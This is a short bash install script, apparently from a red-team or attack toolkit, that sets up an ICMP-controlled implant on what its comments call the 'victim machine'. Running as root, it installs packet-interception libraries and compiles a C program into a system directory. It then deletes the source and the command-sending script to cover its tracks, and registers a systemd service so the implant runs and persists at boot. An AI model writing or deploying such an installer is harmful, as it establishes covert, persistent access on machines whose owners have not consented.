#!/bin/bash
# This folder downloaded from git
# cd into same directory as install.sh
# Must run as root
# Only run on victim machine
if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

apt-get install libnfnetlink-dev libnetfilter-queue-dev
pip install netfilterqueue scapy


mv ./icmp /var/lib/icmp
chmod o+x /var/lib/icmp
rm ./send_command.py
mv ./icmp.service /lib/systemd/system/icmp.service
mkdir -p /lib/icmp
gcc ./icmp.c -o /lib/icmp/icmp
rm ./icmp.c

systemctl start icmp
systemctl enable icmp